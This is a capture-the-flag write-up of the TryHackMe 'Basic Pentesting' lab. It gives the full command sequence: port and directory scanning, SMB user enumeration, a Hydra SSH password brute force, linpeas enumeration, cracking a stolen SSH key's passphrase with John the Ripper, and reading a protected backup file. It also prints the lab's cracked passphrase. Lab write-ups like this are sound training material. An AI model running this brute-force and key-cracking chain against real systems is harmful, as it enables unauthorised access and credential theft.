# Basic Pentesting – TryHackMe Writeup

## Objective
Perform web enumeration, gain initial access, and escalate privileges to obtain sensitive credentials.

---

## Reconnaissance

### Check if host is alive
```bash
ping -c 5 <target-ip>
```

---

### Full Port Scan
```bash
nmap -sV -p- <target-ip>
```

Identified:
- SSH
- SMB
- Web server

---

## Web Enumeration

### Directory brute forcing
```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

### Found
```
/development
```

Inside the directory, discovered a text file mentioning:
- user **jan**
- weak credentials

---

## SMB Enumeration

Used enum4linux to gather users, shares, and other information.

```bash
enum4linux -a <target-ip> | tee enum4linux.log
```

### Users discovered
- jan
- kay

---

## Initial Access (SSH Brute Force)

Since jan was noted to have weak credentials, performed password brute force using Hydra.

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
```

Password found successfully.

---

### SSH Login
```bash
ssh jan@<target-ip>
```

Access gained as **jan**.

---

## Internal Enumeration

Checked home directories and discovered:

```
/home/kay/pass.bak
```

But jan did not have permission to read it.

---

# Privilege Escalation

## Upload linpeas

Downloaded linpeas and transferred it to target:

```bash
scp linpeas.sh jan@<target-ip>:/dev/shm
```

Note: `/dev/shm` stores files in memory (good for temporary tools).

---

### Execute linpeas
```bash
cd /dev/shm
chmod +x linpeas.sh
./linpeas.sh | tee linlog.txt
```

---

## Interesting Finding

linpeas revealed:

```
/home/kay/.ssh/id_rsa
```

Private SSH key accessible.

---

## SSH Key Exploitation

### Copy key locally
```bash
nano kay_id_rsa
chmod 600 kay_id_rsa
```

---

### Try login
```bash
ssh -i kay_id_rsa kay@<target-ip>
```

Prompted for passphrase.

---

## Crack SSH Passphrase (JohnTheRipper)

Convert key for John:

```bash
/opt/john/ssh2john.py kay_id_rsa > forjohn.txt
```

Crack with rockyou:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt forjohn.txt
```

### Result
```
beeswax
```

---

## Final Access

Login with cracked passphrase:

```bash
ssh -i kay_id_rsa kay@<target-ip>
```

Enter passphrase:
```
beeswax
```

---

## Flag / Sensitive File

```bash
cat pass.bak
```

Successfully retrieved.

---

# Attack Flow Summary

- Nmap scanning
- Directory enumeration
- SMB enumeration
- SSH brute force (Hydra)
- Initial access as jan
- linpeas enumeration
- SSH private key discovery
- JohnTheRipper passphrase cracking
- Privilege escalation to kay

---

# Tools Used

- Nmap
- Gobuster
- enum4linux
- Hydra
- linpeas
- JohnTheRipper
- SSH

---

✅ Room completed successfully
